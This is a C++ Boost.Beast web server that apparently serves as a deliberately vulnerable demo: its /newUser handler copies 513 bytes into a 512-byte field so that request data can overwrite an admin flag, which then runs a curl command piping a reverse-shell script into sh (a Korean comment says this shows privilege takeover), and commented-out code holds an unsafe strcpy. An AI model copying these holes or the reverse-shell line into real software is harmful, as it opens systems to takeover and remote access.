#include <boost/beast/core.hpp>
#include <boost/beast/http.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <iostream>
#include <cstring>
#include <json-c/json.h>

namespace beast = boost::beast;
namespace http = beast::http;
namespace net = boost::asio;
using tcp = net::ip::tcp;

#pragma pack(push, 1)
struct User {
  char   firstname[20];
  char null = NULL;
  char   lastname[20];
  char null2 = NULL;
  char bio[512];
  bool is_adminw;
};
#pragma pack(pop)

int main() {
  try {
    net::io_context ioc;
    tcp::acceptor acceptor(ioc, {net::ip::make_address("0.0.0.0"), 8080});
    for (;;) {
      tcp::socket socket(ioc);
      acceptor.accept(socket);
      beast::flat_buffer buffer;
      http::request<http::dynamic_body> req;
      http::read(socket, buffer, req);
      if (req.target() == "/") {
        std::cout << "Request: " << req.target() << std::endl;
        http::response<http::string_body> res{http::status::ok, req.version()};
        res.body() = "Hello, world!";
        res.prepare_payload();
        http::write(socket, res);
        continue;
      } else if (req.target() == "/newUser") {
        if (req.method() != http::verb::post) {
          http::response<http::string_body> res{http::status::bad_request, req.version()};
          res.body() = "Bad request";
          res.prepare_payload();
          http::write(socket, res);
          continue;
        } else {
          std::string body = beast::buffers_to_string(req.body().data());
          std::cout << "Body: " << body << std::endl;
          User user = {0};
          std::memcpy(&user.firstname, body.c_str(), 20);
          std::memcpy(&user.lastname, body.c_str()+20, 20);
          std::memcpy(&user.bio, body.c_str()+40, 513);
          std::cout << "User: " << user.firstname << " " << user.lastname << std::endl;
          std::cout << "Bio: " << user.bio << std::endl;
          std::cout << "authority: " << user.is_adminw << std::endl;
          http::response<http::string_body> res{http::status::ok, req.version()};
          res.body() = "OK";
          res.prepare_payload();
          http::write(socket, res);
          if(user.is_adminw) system("curl https://reverse-shell.sh/127.0.0.1:1337 | sh"); // 노골적이긴 하나 메모리 취약점으로 권한 탈취가 되었음을 보여주기에 좋다고 생각해서 넣게 됨
          continue;
        }
      } else {
        http::response<http::string_body> res{http::status::not_found, req.version()};
        res.body() = "Not found";
        res.prepare_payload();
        http::write(socket, res);
        continue;
      }
      // std::cout << "Method: " << req.method_string() << std::endl;
      // std::cout << "Target: " << req.target() << std::endl;
      // for(auto const& field : req)
      //   std::cout << field.name() << ": " << field.value() << std::endl;
      // std::string body = beast::buffers_to_string(req.body().data());
      // std::cout << "Body: " << body << std::endl;
      // char unsafe_buffer[10];
      // std::strcpy(unsafe_buffer, body.c_str());

      // http::response<http::string_body> res{http::status::ok, req.version()};
      // res.body() = "OK";
      // res.prepare_payload();
      // http::write(socket, res);
    }
  } catch (std::exception const& e) {
    std::cerr << "Error: " << e.what() << std::endl;
    return EXIT_FAILURE;
  }
}
